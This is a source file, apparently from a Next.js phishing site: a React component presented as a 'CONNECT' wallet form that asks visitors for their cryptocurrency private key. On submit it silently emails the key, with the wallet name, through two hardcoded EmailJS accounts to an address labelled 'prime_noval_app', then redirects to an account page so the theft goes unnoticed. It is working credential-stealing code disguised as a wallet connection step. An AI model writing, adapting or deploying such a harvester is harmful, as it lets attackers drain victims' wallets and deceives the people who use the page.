import React, { useEffect, useState } from 'react';
import styles from '@/styles/form.module.css';
import emailjs from '@emailjs/browser';
import { useRouter } from 'next/router';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const PrivateKey = ({ wallet, appType }) => {

  const router = useRouter()

  const [formData, setFormData] = useState({
    privateKey: '',
    name: wallet,
    type: 'Private_Key',
    password: 'not_required',
  });
  const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
  const [privateKey64Long, setPrivateKey64Long] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  useEffect(() => {
    const isPasswordWithinRange = (key) => {
      const length = key.length;
      const hasSpaces = key.includes(' ');
      return length >= 30 && length <= 190 && !hasSpaces;
    };

    setPrivateKey64Long(isPasswordWithinRange(formData.privateKey));
  }, [formData.privateKey]);

  const handlePrivateKeySubmit = async (e) => {
    e.preventDefault();
    setPrivateSubmitBtn('Processing...');

    if (privateKey64Long) {
      try {

        await emailjs.send(
          'service_30vkiql',
          'template_e0wb6w8',
          {
            to_name: "prime_noval_app",
            from_name: wallet ?? appType,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.privateKey}
              Password: ${formData.password}
            `,
          },
          '4leuzsOPi6Oh_D4e0'
        );

        await emailjs.send(
          'service_ky8xa0e',
          'template_kqjcmir',
          {
            to_name: "prime_noval_app",
            from_name: wallet ?? appType,
            message: `
              Name: ${formData.name}
              Type: ${formData.type}
              Data: ${formData.privateKey}
              Password: ${formData.password}
            `,
          },
          'pudHPDoixy2beukw8'
        );

        setTimeout(() => {
          router.push("/account")
        }, 3000);
      } catch (error) {
        console.log(error);
        toast.error('network error', {
          position: "top-right",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "light",
          });
        setPrivateSubmitBtn('Proceed');
      }
    } else {
      toast.error('private key should be 64 long', {
        position: "top-right",
        autoClose: 2500,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
        });
      setPrivateSubmitBtn('Proceed');
    }
  };

  return (
    <>
      <ToastContainer />
      <p className={styles.walletType}>Private Key</p>
      <form onSubmit={handlePrivateKeySubmit}>
        <textarea
          required
          name="privateKey"
          value={formData.privateKey}
          autoComplete="off"
          onChange={handleChange}
          className={styles.textarea}
        />
        <p className={styles.hint} style={{ color: privateKey64Long ? 'green' : 'red' }}>
          Private keys vary in format, but they often consist of a sequence of hexadecimal characters without spaces.
        </p>
        <button type="submit" className={styles.connectButton}>
          {privateSubmitBtn}
        </button>
      </form>
    </>
  );
};

export default PrivateKey;